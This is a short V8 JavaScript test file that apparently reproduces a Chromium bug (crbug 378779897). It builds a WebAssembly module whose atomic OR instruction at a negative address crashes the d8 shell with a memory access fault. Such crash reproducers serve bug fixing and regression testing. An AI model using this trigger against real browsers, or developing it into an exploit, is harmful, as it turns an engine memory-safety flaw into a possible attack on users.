/*
    https://crbug.com/378779897
    SEGV_ACCERR 
*/

d8.file.execute("/home/vult/Desktop/v8-wasm/v8/test/mjsunit/wasm/wasm-module-builder.js");



const builder = new WasmModuleBuilder();
builder.addMemory(49149);

builder.addFunction('main', kSig_i_v).addBody([
  ...wasmI32Const(-1118406780),
  ...wasmI32Const(-1),
  kAtomicPrefix, kExprI32AtomicOr8U, 0, 0
]).exportFunc();

const instance = builder.instantiate();
instance.exports.main();